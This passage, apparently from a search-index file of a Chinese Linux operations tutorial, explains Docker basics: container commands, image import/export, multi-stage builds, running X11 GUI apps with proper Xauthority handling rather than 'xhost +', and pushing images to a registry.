<p>\u200b\u4ee5\u53ca\u200b\u5e38\u89c1\u200b\u7684\u200b\u5bb9\u5668\u200b\u7ba1\u7406\u200b\u547d\u4ee4\u200b\uff1a</p> <ul> <li><code>docker ps</code>\uff1a\u200b\u67e5\u770b\u200b\u5bb9\u5668\u200b</li> <li><code>docker exec -it CONTAINER COMMAND</code>\uff1a\u200b\u5728\u200b\u5bb9\u5668\u200b\u5185\u200b\u6267\u884c\u547d\u4ee4\u200b</li> <li><code>docker inspect CONTAINER</code>\uff1a\u200b\u67e5\u770b\u200b\u5bb9\u5668\u200b\u8be6\u7ec6\u4fe1\u606f\u200b</li> </ul> <p>\u200b\u4e0e\u200b\u67e5\u770b\u200b\u3001\u200b\u6e05\u7406\u200b Docker \u200b\u78c1\u76d8\u200b\u5360\u7528\u200b\u7b49\u200b\u64cd\u4f5c\u200b\uff1a</p> <ul> <li><code>docker system df</code>\uff1a\u200b\u67e5\u770b\u200b\u955c\u50cf\u200b\u3001\u200b\u5bb9\u5668\u200b\u3001volume \u200b\u4e0e\u200b\u6784\u5efa\u200b\u7f13\u5b58\u200b\u7684\u200b\u78c1\u76d8\u200b\u5360\u7528\u200b</li> <li><code>docker system prune --volumes --all</code>\uff1a\u200b\u6e05\u7406\u200b\u4e0d\u518d\u200b\u4f7f\u7528\u200b\u7684\u200b\u955c\u50cf\u200b\u3001\u200b\u5bb9\u5668\u200b\u3001volume\u3001network \u200b\u4e0e\u200b\u5168\u90e8\u200b\u6784\u5efa\u200b\u7f13\u5b58\u200b</li> </ul>"},{"location":"ops/virtualization/container/#docker-import-export","title":"\u5bfc\u5165\u200b\u4e0e\u200b\u5bfc\u51fa","text":"<p>Docker \u200b\u652f\u6301\u200b\u5bfc\u51fa\u200b\u5bb9\u5668\u200b\u4e0e\u200b\u955c\u50cf\u200b\uff0c\u200b\u5e76\u200b\u4ee5\u200b\u955c\u50cf\u200b\u7684\u200b\u5f62\u5f0f\u200b\u5bfc\u5165\u200b\uff0c\u200b\u683c\u5f0f\u200b\u5747\u200b\u4e3a\u200b tar\u3002\u200b\u53ef\u4ee5\u200b\u901a\u8fc7\u200b\u7ba1\u9053\u200b\u7684\u200b\u65b9\u5f0f\u200b\u5b9e\u73b0\u200b\u538b\u7f29\u200b\uff1a</p> <pre><code>$ # \u200b\u955c\u50cf\u200b\u5bfc\u5165\u200b/\u200b\u5bfc\u51fa\u200b\n$ sudo docker image save hello-world:latest | zstd -o hello-world.tar.zst\n/*stdin*\\            : 15.11%   (  26.0 KiB =&gt;   3.93 KiB, hello-world.tar.zst)\n$ sudo docker image rm hello-world:latest\n$ zstd -d -c hello-world.tar.zst | sudo docker image load\ne07ee1baac5f: Loading layer [==================================================&gt;]  14.85kB/14.85kB\nLoaded image: hello-world:latest\n$ # \u200b\u5bb9\u5668\u200b\u5bfc\u51fa\u200b\uff0c\u200b\u5e76\u200b\u4ee5\u200b\u955c\u50cf\u200b\u5f62\u5f0f\u200b\u5bfc\u5165\u200b\n$ sudo docker run -it --name test ustclug/debian:12 touch /test\n$ sudo docker container export test | zstd -o test.tar.zst\n/*stdin*\\            : 33.93%   (   116 MiB =&gt;   39.2 MiB, test.tar.zst)\n$ sudo docker rm test\n$ zstd -d -c test.tar.zst | sudo docker import - test\nsha256:21a35d8f910941f4913ada5f3600c04234d13860fe498ac5cb301ba1801aa82c\n$ sudo docker run -it --rm test ls /test\n/test\n</code></pre> <p>\u200b\u5176\u4e2d\u200b\u955c\u50cf\u200b\u5bfc\u51fa\u200b\uff08save\uff09\u200b\u540e\u200b\u4ecd\u7136\u200b\u6709\u200b\u5c42\u7ea7\u200b\u7ed3\u6784\u200b\uff0c\u200b\u4f46\u662f\u200b\u5bb9\u5668\u200b\u5bfc\u51fa\u200b\uff08export\uff09\u200b\u540e\u200b\u5219\u200b\u662f\u200b\u4e00\u4e2a\u200b\u5b8c\u6574\u200b\u7684\u200b\u6587\u4ef6\u7cfb\u7edf\u200b\u3002</p> <p>\u200b\u4e5f\u200b\u6709\u200b\u4e00\u4e9b\u200b\u5de5\u5177\u200b\uff0c\u200b\u4f8b\u5982\u200b dive\uff0c\u200b\u53ef\u4ee5\u200b\u65b9\u4fbf\u200b\u5730\u200b\u67e5\u770b\u200b\u955c\u50cf\u200b\u6bcf\u200b\u4e00\u5c42\u200b\u7684\u200b\u5185\u5bb9\u200b\u3002</p>"},{"location":"ops/virtualization/container/#docker-multi-stage","title":"\u591a\u200b\u9636\u6bb5\u200b\u6784\u5efa","text":"<p>\u200b\u5728\u200b\u5236\u4f5c\u200b\u5bb9\u5668\u200b\u955c\u50cf\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u4e00\u4e2a\u200b\u5e38\u89c1\u200b\u7684\u200b\u573a\u666f\u200b\u662f\u200b\uff1a\u200b\u7f16\u8bd1\u200b\u8f6f\u4ef6\u200b\u548c\u200b\u5b9e\u9645\u200b\u8fd0\u884c\u200b\u7684\u200b\u73af\u5883\u200b\u662f\u200b\u4e0d\u540c\u200b\u7684\u200b\u3002 \u200b\u5982\u679c\u200b\u5c06\u200b\u4e24\u8005\u200b\u5199\u200b\u5728\u200b\u4e0d\u540c\u200b\u7684\u200b Dockerfile \u200b\u4e2d\u200b\uff0c\u200b\u5b9e\u9645\u64cd\u4f5c\u200b\u4f1a\u200b\u5f88\u200b\u9ebb\u70e6\u200b\uff08\u200b\u9700\u8981\u200b\u5148\u200b\u6784\u5efa\u200b\u7f16\u8bd1\u200b\u5bb9\u5668\u200b\u3001\u200b\u8fd0\u884c\u200b\u5bb9\u5668\u200b\u3001\u200b\u518d\u200b\u6784\u5efa\u200b\u8fd0\u884c\u200b\u73af\u5883\u200b\u5bb9\u5668\u200b\uff09\uff1b \u200b\u5982\u679c\u200b\u5199\u200b\u5728\u200b\u540c\u4e00\u4e2a\u200b Dockerfile \u200b\u91cc\u9762\u200b\uff0c\u200b\u5e76\u4e14\u200b\u9700\u8981\u200b\u6e05\u7406\u200b\u6389\u200b\u5b9e\u9645\u200b\u8fd0\u884c\u200b\u65f6\u200b\u4e0d\u200b\u9700\u8981\u200b\u7684\u200b\u6587\u4ef6\u200b\uff0c\u200b\u4e5f\u200b\u4f1a\u200b\u975e\u5e38\u200b\u975e\u5e38\u200b\u9ebb\u70e6\u200b\uff1a</p> <pre><code># \u200b\u90a3\u4e48\u200b\u53ef\u80fd\u200b\u53ea\u80fd\u200b\u8fd9\u4e48\u200b\u5199\u200b\uff0c\u200b\u5426\u5219\u200b\u7f16\u8bd1\u200b\u73af\u5883\u200b\u4ecd\u7136\u200b\u4f1a\u200b\u6b8b\u7559\u200b\u5728\u200b\u955c\u50cf\u200b\u4e2d\u200b\nRUN apt install -y some-dev-package another-dev-package ... &amp;&amp; \\\n    wget https://example.com/some-source.tar.gz &amp;&amp; \\\n    tar -zxvf some-source.tar.gz &amp;&amp; \\\n    ./configure --some-option &amp;&amp; make &amp;&amp; make install &amp;&amp; \\\n    rm -rf /some-source.tar.gz /some-source &amp;&amp; \\\n    apt remove -y some-dev-package another-dev-package ... &amp;&amp; \\\n</code></pre> <p>Dockerfile \u200b\u5bf9\u200b\u591a\u200b\u9636\u6bb5\u200b\uff08multi-stage\uff09\u200b\u7684\u200b\u652f\u6301\u200b\u5f88\u200b\u597d\u5730\u89e3\u51b3\u200b\u4e86\u200b\u8fd9\u4e2a\u200b\u95ee\u9898\u200b\uff0c\u200b\u4e00\u4e2a\u200b\u7b80\u5355\u200b\u7684\u200b\u4f8b\u5b50\u200b\u5982\u4e0b\u200b\uff1a</p> <pre><code>FROM alpine:3.15 AS builder\nRUN apk add --no-cache build-base\nWORKDIR /tmp\nADD example.c .\nRUN gcc -o example example.c\n\nFROM alpine:3.15\nCOPY --from=builder /tmp/example /usr/local/bin/example\n</code></pre> <p>\u200b\u53ef\u4ee5\u200b\u53d1\u73b0\u200b\uff0c\u200b\u8fd9\u4e2a\u200b Dockerfile \u200b\u6709\u200b\u591a\u4e2a\u200b <code>FROM</code> \u200b\u4ee3\u8868\u200b\u4e86\u200b\u591a\u4e2a\u200b\u9636\u6bb5\u200b\u3002 \u200b\u7b2c\u4e00\u9636\u6bb5\u200b\u7684\u200b <code>FROM</code> \u200b\u540e\u9762\u200b\u52a0\u4e0a\u200b\u4e86\u200b <code>AS builder</code>\uff0c\u200b\u8fd9\u6837\u200b\u5c31\u200b\u53ef\u4ee5\u200b\u5728\u200b\u7b2c\u4e8c\u9636\u6bb5\u200b\u4f7f\u7528\u200b <code>COPY --from=builder</code> \u200b\u4ece\u200b\u7b2c\u4e00\u9636\u6bb5\u200b\u62f7\u8d1d\u200b\u6587\u4ef6\u200b\u3002</p>"},{"location":"ops/virtualization/container/#docker-gui","title":"\u8fd0\u884c\u200b\u56fe\u5f62\u200b\u5e94\u7528","text":"<p>\u200b\u5728\u200b\u5bb9\u5668\u200b\u4e2d\u200b\u8fd0\u884c\u200b\u56fe\u5f62\u200b\u7a0b\u5e8f\u200b\u4e5f\u200b\u662f\u200b\u76f8\u5f53\u200b\u5e38\u89c1\u200b\u7684\u200b\u9700\u6c42\u200b\u3002 \u200b\u4ee5\u4e0b\u200b\u7b80\u5355\u200b\u4ecb\u7ecd\u200b\u5728\u200b Docker \u200b\u4e2d\u200b\u8fd0\u884c\u200b X11 \u200b\u56fe\u5f62\u200b\u5e94\u7528\u200b\uff08\u200b\u5373\u200b X \u200b\u5ba2\u6237\u7aef\u200b\uff09\u200b\u7684\u200b\u65b9\u6cd5\u200b\uff0c\u200b\u5047\u8bbe\u200b\u4e3b\u673a\u200b\u73af\u5883\u200b\u5df2\u7ecf\u200b\u914d\u7f6e\u200b\u597d\u200b\u4e86\u200b X \u200b\u670d\u52a1\u5668\u200b\u3002</p> <p>X \u200b\u5ba2\u6237\u7aef\u200b\u4e0e\u200b\u670d\u52a1\u5668\u200b</p> <p>X \u200b\u670d\u52a1\u5668\u200b\u8d1f\u8d23\u200b\u663e\u793a\u200b\u56fe\u5f62\u754c\u9762\u200b\uff0c\u200b\u800c\u200b\u5177\u4f53\u200b\u7684\u200b\u56fe\u5f62\u754c\u9762\u200b\u7a0b\u5e8f\u200b\uff0c\u200b\u5373\u200b X \u200b\u5ba2\u6237\u7aef\u200b\uff0c\u200b\u5219\u200b\u9700\u8981\u200b\u8fde\u63a5\u200b\u5230\u200b X \u200b\u670d\u52a1\u5668\u200b\u624d\u80fd\u200b\u7ed8\u5236\u200b\u51fa\u200b\u81ea\u5df1\u200b\u7684\u200b\u7a97\u53e3\u200b\u3002</p> <p>\u200b\u5982\u679c\u200b\u4f60\u200b\u6b63\u5728\u200b\u4f7f\u7528\u200b Linux \u200b\u4f5c\u4e3a\u200b\u684c\u9762\u73af\u5883\u200b\uff0c\u200b\u90a3\u4e48\u200b\u8981\u4e48\u200b\u6574\u4e2a\u200b\u684c\u9762\u73af\u5883\u200b\u5c31\u200b\u7531\u200b X \u200b\u670d\u52a1\u5668\u200b\u6e32\u67d3\u200b\uff0c\u200b\u8981\u4e48\u200b\u5728\u200b Wayland \u200b\u4e0b\u200b Xwayland \u200b\u4f1a\u200b\u4f5c\u4e3a\u200b X \u200b\u670d\u52a1\u5668\u200b\u63d0\u4f9b\u200b\u517c\u5bb9\u200b\u3002\u200b\u5982\u679c\u200b\u6b63\u5728\u200b\u4f7f\u7528\u200b Windows \u200b\u6216\u200b macOS\uff0c\u200b\u5219\u200b\u9700\u8981\u200b\u5404\u81ea\u200b\u5b89\u88c5\u200b X \u200b\u670d\u52a1\u5668\u200b\u5b9e\u73b0\u200b\u3002</p> <p>\u200b\u5bf9\u4e8e\u200b SSH \u200b\u8fde\u63a5\u200b\u5230\u200b\u8fdc\u7a0b\u200b\u670d\u52a1\u5668\u200b\u7684\u200b\u573a\u666f\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b <code>ssh -X</code>\uff08\u200b\u6216\u200b <code>ssh -Y</code> (1)\uff09\u200b\u4e3a\u200b\u8fdc\u7a0b\u200b\u7684\u200b\u670d\u52a1\u5668\u200b\u4e0a\u200b\u7684\u200b X \u200b\u5ba2\u6237\u7aef\u200b\u66b4\u9732\u200b\u81ea\u5df1\u200b\u7684\u200b X \u200b\u670d\u52a1\u5668\u200b\u3002\u200b\u4e0b\u9762\u200b\u7684\u200b\u4f8b\u5b50\u200b\u5047\u8bbe\u200b\u4e86\u200b X \u200b\u670d\u52a1\u5668\u200b socket \u200b\u662f\u200b\u4e00\u4e2a\u200b\u672c\u5730\u200b\u7684\u200b UNIX socket \u200b\u6587\u4ef6\u200b\uff0c\u200b\u4f46\u662f\u200b\u8fd9\u200b\u5bf9\u200b SSH X forwarding \u200b\u7684\u200b\u573a\u666f\u200b\u6765\u8bf4\u200b\u5e76\u200b\u4e0d\u200b\u9002\u7528\u200b\uff08SSH \u200b\u4f1a\u200b\u4f7f\u7528\u200b TCP \u200b\u8f6c\u53d1\u200b X \u200b\u7aef\u53e3\u200b\uff09\u3002\u200b\u5bf9\u5e94\u200b\u7684\u200b\uff0c\u200b\u5982\u679c\u200b\u6b63\u5728\u200b\u4f7f\u7528\u200b SSH \u200b\u6d4b\u8bd5\u200b\u4e0b\u9762\u200b\u7684\u200b\u5185\u5bb9\u200b\uff0c\u200b\u90a3\u4e48\u200b\u5728\u200b\u4f20\u9012\u200b\u73af\u5883\u53d8\u91cf\u200b\u4e0e\u200b <code>$HOME/.Xauthority</code> \u200b\u6587\u4ef6\u200b\u7684\u200b\u540c\u65f6\u200b\uff0c\u200b\u8fd8\u200b\u9700\u8981\u200b\u8bbe\u7f6e\u200b\u5bb9\u5668\u200b\u4e0e\u200b\u4e3b\u673a\u200b\u4f7f\u7528\u200b\u76f8\u540c\u200b\u7684\u200b\u7f51\u7edc\u200b\uff08<code>--network host</code>\uff09\u3002</p> <ol> <li>\u200b\u5f53\u200b\u4f7f\u7528\u200b <code>-X</code> \u200b\u65f6\u200b\uff0c\u200b\u670d\u52a1\u7aef\u200b\u4f1a\u200b\u5047\u8bbe\u200b\u5ba2\u6237\u7aef\u200b\u662f\u200b\u4e0d\u53ef\u200b\u4fe1\u4efb\u200b\u7684\u200b\uff0c\u200b\u56e0\u6b64\u200b\u4f1a\u200b\u9650\u5236\u200b\u4e00\u4e9b\u200b\u64cd\u4f5c\u200b\uff1b<code>-Y</code> \u200b\u9009\u9879\u200b\u5219\u200b\u4f1a\u200b\u653e\u5bbd\u200b\u8fd9\u4e9b\u200b\u9650\u5236\u200b\u3002\u200b\u8be6\u89c1\u200b ssh_config(5) \u200b\u5bf9\u200b <code>ForwardX11Trusted</code> \u200b\u7684\u200b\u4ecb\u7ecd\u200b\u3002</li> </ol> <p>X \u200b\u5ba2\u6237\u7aef\u200b\u8fde\u63a5\u200b\u5230\u200b\u670d\u52a1\u5668\u200b\uff0c\u200b\u9996\u5148\u200b\u9700\u8981\u200b\u77e5\u9053\u200b X \u200b\u670d\u52a1\u5668\u200b\u7684\u200b\u5730\u5740\u200b\u3002\u200b\u8fd9\u200b\u662f\u200b\u7531\u200b <code>DISPLAY</code> \u200b\u73af\u5883\u53d8\u91cf\u200b\u6307\u5b9a\u200b\u7684\u200b\uff0c\u200b\u4e00\u822c\u200b\u662f\u200b <code>:0</code>\uff0c\u200b\u4ee3\u8868\u200b\u8fde\u63a5\u200b\u5230\u200b <code>/tmp/.X11-unix/X0</code> \u200b\u8fd9\u4e2a\u200b UNIX socket\u3002\u200b\u6b64\u5916\u200b\uff0c\u200b\u7531\u4e8e\u200b X \u200b\u7684\u200b\u534f\u8bae\u200b\u8bbe\u8ba1\u200b\u662f\u200b\u300c\u200b\u7f51\u7edc\u200b\u900f\u660e\u200b\u300d\u200b\u7684\u200b\uff0c\u200b\u56e0\u6b64\u200b X \u200b\u670d\u52a1\u5668\u200b\u7406\u8bba\u200b\u4e0a\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u4ee5\u200b TCP \u200b\u7684\u200b\u65b9\u5f0f\u200b\u66b4\u9732\u200b\u51fa\u6765\u200b\uff08\u200b\u4f46\u662f\u200b\u4e0d\u200b\u5efa\u8bae\u200b\u8fd9\u4e48\u200b\u505a\u200b\uff09\uff0c\u200b\u5ba2\u6237\u7aef\u200b\u901a\u8fc7\u200b\u7c7b\u4f3c\u200b\u4e8e\u200b <code>DISPLAY=host:port</code> \u200b\u7684\u200b\u65b9\u5f0f\u200b\u8fde\u63a5\u200b\u3002</p> <p>X \u200b\u4e0e\u200b\u62bd\u8c61\u200b\u5957\u200b\u63a5\u5b57\u200b\uff08abstract socket\uff09</p> <p>\u200b\u76ee\u524d\u200b\uff0cX server \u200b\u4f1a\u200b\u9ed8\u8ba4\u200b\u5f00\u542f\u200b abstract socket \u200b\u652f\u6301\u200b\uff0c\u200b\u5373\u4f7f\u200b\u4e0d\u200b\u5171\u4eab\u200b <code>/tmp/.X11-unix</code>\uff0cX \u200b\u5ba2\u6237\u7aef\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u4ee5\u6b64\u200b\u8fde\u63a5\u200b\u5230\u200b X \u200b\u670d\u52a1\u5668\u200b\u3002Abstract socket \u200b\u53ea\u80fd\u200b\u901a\u8fc7\u200b\u7f51\u7edc\u200b\u547d\u540d\u200b\u7a7a\u95f4\u9694\u79bb\u200b\u3002\u200b\u8be6\u60c5\u200b\u89c1\u200b\u9ad8\u7ea7\u200b\u5185\u5bb9\u200b\u7684\u200b\u300cLinux \u200b\u684c\u9762\u200b\u4e0e\u200b\u7a97\u53e3\u200b\u7cfb\u7edf\u200b\u300d\u200b\u90e8\u5206\u200b\u3002</p> <p>\u200b\u56e0\u6b64\u200b\uff0c\u200b\u9996\u5148\u200b\u9700\u8981\u200b\u4f20\u9012\u200b <code>DISPLAY</code> \u200b\u73af\u5883\u53d8\u91cf\u200b\uff0c\u200b\u5e76\u4e14\u200b\u5c06\u200b <code>/tmp/.X11-unix</code> \u200b\u6302\u8f7d\u200b\u5230\u200b\u5bb9\u5668\u200b\u4e2d\u200b\uff1a</p> <pre><code>sudo docker run -it --rm -e \"DISPLAY=$DISPLAY\" -v /tmp/.X11-unix:/tmp/.X11-unix ustclug/debian:12\n</code></pre> <p>\u200b\u4e3a\u4e86\u200b\u6d4b\u8bd5\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u5728\u200b\u5bb9\u5668\u200b\u91cc\u200b\u5b89\u88c5\u200b <code>x11-apps</code>\uff0c\u200b\u7136\u540e\u200b\u8fd0\u884c\u200b <code>xeyes</code>\u3002\u200b\u5982\u679c\u200b\u914d\u7f6e\u200b\u6b63\u786e\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u770b\u5230\u200b\u4e00\u53cc\u200b\u773c\u775b\u200b\u5728\u200b\u8ddf\u968f\u200b\u9f20\u6807\u200b\u3002 \u200b\u4f46\u662f\u200b\u4e0a\u9762\u200b\u7684\u200b\u914d\u7f6e\u200b\u662f\u200b\u4e0d\u591f\u200b\u7684\u200b\uff1a</p> <pre><code>root@6f640b929f0e:/# xeyes\nAuthorization required, but no authorization protocol specified\n\nError: Can't open display: :0\n</code></pre> <p>\u200b\u8fd9\u200b\u662f\u56e0\u4e3a\u200b X \u200b\u670d\u52a1\u5668\u200b\u9700\u8981\u200b\u8ba4\u8bc1\u200b\u4fe1\u606f\u200b\u624d\u200b\u80fd\u591f\u200b\u8fde\u63a5\u200b\uff0c\u200b\u5bf9\u5e94\u200b\u7684\u200b\u8ba4\u8bc1\u200b\u4fe1\u606f\u200b\u5c31\u200b\u5728\u200b\u540d\u4e3a\u200b \"Xauthority\" \u200b\u7684\u200b\u6587\u4ef6\u200b\u4e2d\u200b\uff0c\u200b\u5bf9\u5e94\u200b <code>XAUTHORITY</code> \u200b\u73af\u5883\u53d8\u91cf\u200b\uff1a</p> <pre><code>$ echo $XAUTHORITY  # \u200b\u4e00\u4e2a\u200b\u4f8b\u5b50\u200b\uff0c\u200b\u5b9e\u9645\u200b\u503c\u4f1a\u200b\u6839\u636e\u200b\u73af\u5883\u200b\u4e0d\u540c\u200b\u800c\u200b\u4e0d\u540c\u200b\n/run/user/1000/.mutter-Xwaylandauth.5S15L2\n</code></pre> <p>\u200b\u5982\u679c\u200b\u8fd9\u4e2a\u200b\u73af\u5883\u53d8\u91cf\u200b\u4e0d\u200b\u5b58\u5728\u200b\uff0c\u200b\u90a3\u4e48\u200b\u5c31\u200b\u4f1a\u200b\u4f7f\u7528\u200b\u9ed8\u8ba4\u503c\u200b\uff1a\u200b\u5f53\u524d\u200b\u7528\u6237\u200b\u7684\u200b\u5bb6\u200b\u76ee\u5f55\u200b\u4e0b\u200b\u7684\u200b <code>.Xauthority</code> \u200b\u6587\u4ef6\u200b\u3002</p> <p>\u200b\u907f\u514d\u200b\u76f4\u63a5\u200b\u5173\u95ed\u200b\u8ba4\u8bc1\u200b\u7684\u200b\u505a\u6cd5\u200b</p> <p>\u200b\u5982\u679c\u200b\u9605\u8bfb\u200b\u7f51\u7edc\u200b\u4e0a\u200b\u7684\u200b\u4e00\u4e9b\u200b\u6559\u7a0b\u200b\uff0c\u200b\u5b83\u4eec\u200b\u53ef\u80fd\u200b\u4f1a\u200b\u5efa\u8bae\u200b\u76f4\u63a5\u200b\u5173\u95ed\u200b X \u200b\u670d\u52a1\u5668\u200b\u7684\u200b\u8ba4\u8bc1\u200b\uff0c\u200b\u5c31\u200b\u50cf\u200b\u8fd9\u6837\u200b\uff1a</p> <pre><code>xhost +\n</code></pre> <p>\u200b\u8fd9\u200b\u5728\u200b\u5b89\u5168\u6027\u200b\u4e0a\u200b\u662f\u200b\u975e\u5e38\u200b\u7cdf\u7cd5\u200b\u7684\u200b\u505a\u6cd5\u200b\uff0c\u200b\u56e0\u4e3a\u200b\u8fd9\u6837\u7684\u8bdd\u200b\u5c31\u200b\u4f1a\u200b\u5141\u8bb8\u200b\u6240\u6709\u200b\u80fd\u200b\u8bbf\u95ee\u200b\u5230\u200b X \u200b\u670d\u52a1\u5668\u200b\u7684\u200b\u4eba\u200b/\u200b\u7a0b\u5e8f\u200b\u8fde\u63a5\u200b\u3002</p> <p>\u200b\u6240\u4ee5\u200b\u4e5f\u200b\u9700\u8981\u200b\u5c06\u200b\u8fd9\u200b\u4e00\u5bf9\u200b\u73af\u5883\u53d8\u91cf\u200b\u548c\u200b\u6587\u4ef6\u200b\u585e\u8fdb\u6765\u200b\uff1a</p> <pre><code>sudo docker run -it --rm -e \"DISPLAY=$DISPLAY\" -e \"XAUTHORITY=$XAUTHORITY\" -v /tmp/.X11-unix:/tmp/.X11-unix -v $XAUTHORITY:$XAUTHORITY ustclug/debian:12\n</code></pre> <p>\u200b\u8fd9\u6837\u200b\u5c31\u200b\u53ef\u4ee5\u200b\u5728\u200b\u5bb9\u5668\u200b\u4e2d\u200b\u8fd0\u884c\u200b\u57fa\u672c\u200b\u7684\u200b\u56fe\u5f62\u200b\u5e94\u7528\u200b\u4e86\u200b\u3002 \u200b\u4e0d\u8fc7\u200b\uff0c\u200b\u5982\u679c\u200b\u5b9e\u9645\u200b\u9700\u6c42\u200b\u662f\u200b\u5728\u200b\u7c7b\u4f3c\u200b\u6c99\u76d2\u200b\u7684\u200b\u73af\u5883\u4e2d\u8fd0\u884c\u200b\u56fe\u5f62\u200b\u5e94\u7528\u200b\uff0c\u200b\u6709\u200b\u4e00\u4e9b\u200b\u66f4\u200b\u5408\u9002\u200b\u7684\u200b\u9009\u62e9\u200b\uff0c\u200b\u4f8b\u5982\u200b bubblewrap \u200b\u4ee5\u53ca\u200b\u57fa\u4e8e\u200b\u6b64\u200b\u7684\u200b Flatpak \u200b\u7b49\u200b\u3002</p> GPU <p>\uff08\u200b\u4ee5\u4e0b\u5185\u5bb9\u200b\u4e0d\u200b\u5b8c\u5168\u200b\u9002\u7528\u200b\u4e8e\u200b\u4f7f\u7528\u200b NVIDIA \u200b\u4e13\u6709\u200b\u9a71\u52a8\u200b\u7684\u200b NVIDIA GPU\uff09</p> <p>\u200b\u5728\u200b Linux \u200b\u4e0b\u200b\uff0cGPU \u200b\u8bbe\u5907\u200b\u6587\u4ef6\u200b\u4f4d\u4e8e\u200b <code>/dev/dri</code> \u200b\u76ee\u5f55\u200b\u4e0b\u200b\u3002\u200b\u6bcf\u5f20\u200b\u663e\u5361\u200b\u4f1a\u200b\u66b4\u9732\u200b\u4e24\u4e2a\u200b\u8bbe\u5907\u200b\u6587\u4ef6\u200b\uff0c\u200b\u5176\u4e2d\u200b <code>cardX</code> \u200b\u4ee3\u8868\u200b\u4e86\u200b\u5b8c\u6574\u200b\u7684\u200b GPU \u200b\u8bbe\u5907\u200b\uff08\u200b\u6709\u200b\u5199\u5165\u200b\u6743\u9650\u200b\u76f8\u5f53\u4e8e\u200b\u6709\u200b\u63a7\u5236\u200b GPU \u200b\u7684\u200b\u5b8c\u6574\u200b\u6743\u9650\u200b\uff09\uff0c\u200b\u800c\u200b <code>renderDXXX</code> \u200b\u4ee3\u8868\u200b\u4e86\u200b GPU \u200b\u7684\u200b\u6e32\u67d3\u200b\u8bbe\u5907\u200b\u3002\u200b\u5bf9\u4e8e\u200b\u9700\u8981\u200b GPU \u200b\u52a0\u901f\u200b\u6e32\u67d3\u200b\u7684\u200b\u573a\u666f\u200b\uff0c\u200b\u4e3a\u200b\u5176\u200b\u6302\u8f7d\u200b <code>/dev/dri/renderDXXX</code> \u200b\u8bbe\u5907\u200b\u5373\u53ef\u200b\u3002</p> <p>\u200b\u4e0e\u6b64\u540c\u65f6\u200b\uff0c\u200b\u5bb9\u5668\u200b\u5185\u200b\u8fd8\u200b\u9700\u8981\u200b\u5b89\u88c5\u200b\u5bf9\u5e94\u200b\u7684\u200b GPU \u200b\u7528\u6237\u200b\u6001\u200b\u9a71\u52a8\u200b\u3002\u200b\u5bf9\u4e8e\u200b\u5f00\u6e90\u200b\u9a71\u52a8\u200b\u6765\u8bf4\u200b\uff0c\u200b\u5b89\u88c5\u200b Mesa \u200b\u5373\u53ef\u200b\u3002</p>"},{"location":"ops/virtualization/container/#registry","title":"Registry","text":"<p>Registry \u200b\u662f\u200b\u5b58\u50a8\u200b\u4e0e\u200b\u5206\u53d1\u200b\u5bb9\u5668\u200b\u955c\u50cf\u200b\u7684\u200b\u670d\u52a1\u200b\u3002\u200b\u5728\u200b\u5927\u90e8\u5206\u200b\u65f6\u5019\u200b\uff0c\u200b\u6211\u4eec\u200b\u4f7f\u7528\u200b\u7684\u200b registry \u200b\u662f\u200b Docker Hub\u3002</p> <p>\u200b\u533a\u5206\u200b Docker \u200b\u548c\u200b Docker Hub</p> <p>Docker \u200b\u662f\u200b\u5bb9\u5668\u200b\u8fd0\u884c\u200b\u65f6\u200b\uff0c\u200b\u800c\u200b Docker Hub \u200b\u662f\u200b\u4e00\u4e2a\u200b registry \u200b\u670d\u52a1\u200b\u3002\u200b\u9664\u4e86\u200b Docker Hub \u200b\u4ee5\u5916\u200b\uff0c\u200b\u8fd8\u6709\u200b\u5f88\u591a\u200b\u5176\u4ed6\u200b\u7684\u200b registry \u200b\u670d\u52a1\u200b\uff0c \u200b\u8fd9\u4e9b\u200b\u670d\u52a1\u200b\u63d0\u4f9b\u200b\u7684\u200b\u5bb9\u5668\u200b\u955c\u50cf\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u6b63\u5e38\u200b\u5728\u200b Docker \u200b\u4e2d\u200b\u4f7f\u7528\u200b\u3002</p> <p>\u200b\u955c\u50cf\u200b\u540d\u79f0\u200b\u7684\u200b\u683c\u5f0f\u200b\u662f\u200b <code>registry/namespace/repository:tag</code>\uff0c\u200b\u5176\u4e2d\u200b\u5728\u200b Docker \u200b\u4e2d\u200b\uff0c\u200b\u5982\u679c\u200b\u6ca1\u6709\u200b\u6307\u5b9a\u200b registry\uff0c\u200b\u9ed8\u8ba4\u200b\u4f1a\u200b\u4f7f\u7528\u200b Docker Hub\uff08<code>docker.io</code>\uff09\uff1b\u200b\u800c\u200b\u5982\u679c\u200b\u6ca1\u6709\u200b\u6307\u5b9a\u200b namespace\uff0c\u200b\u5219\u200b\u9ed8\u8ba4\u200b\u4f1a\u200b\u6307\u5b9a\u200b\u4e3a\u200b <code>library</code>\uff0c\u200b\u5176\u200b\u4ee3\u8868\u200b Docker Hub \u200b\u4e2d\u200b\u7684\u200b\u300c\u200b\u5b98\u65b9\u200b\u300d\u200b\u955c\u50cf\u200b\uff1b\u200b\u5982\u679c\u200b\u6ca1\u6709\u200b\u6307\u5b9a\u200b tag\uff0c\u200b\u5219\u200b\u9ed8\u8ba4\u200b\u91c7\u7528\u200b <code>latest</code>\u3002</p> <p>Registry \u200b\u670d\u52a1\u200b\u5927\u591a\u200b\u5141\u8bb8\u200b\u7528\u6237\u200b\u4e0a\u4f20\u200b\u81ea\u5df1\u200b\u7684\u200b\u5bb9\u5668\u200b\u955c\u50cf\u200b\u3002\u200b\u5728\u200b\u5bf9\u5e94\u200b\u7684\u200b\u670d\u52a1\u5e73\u53f0\u200b\u6ce8\u518c\u200b\u5e10\u53f7\u200b\uff0c\u200b\u4f7f\u7528\u200b <code>docker login</code> \u200b\u767b\u5f55\u200b\u4e4b\u540e\u200b\uff0c\u200b\u9700\u8981\u200b\u5148\u200b\u4f7f\u7528\u200b <code>docker tag</code> \u200b\u4e3a\u200b\u81ea\u5df1\u200b\u7684\u200b\u955c\u50cf\u200b\u6253\u200b\u4e0a\u200b\u5bf9\u5e94\u200b\u7684\u200b\u6807\u7b7e\u200b\uff1a</p> <pre><code>sudo docker tag example:latest registry.example.com/username/example:latest\n</code></pre> <p>\u200b\u7136\u540e\u200b\u518d\u200b <code>docker push</code>\uff1a</p> <pre><code>sudo docker push registry.example.com/username/example:latest\n</code></pre> 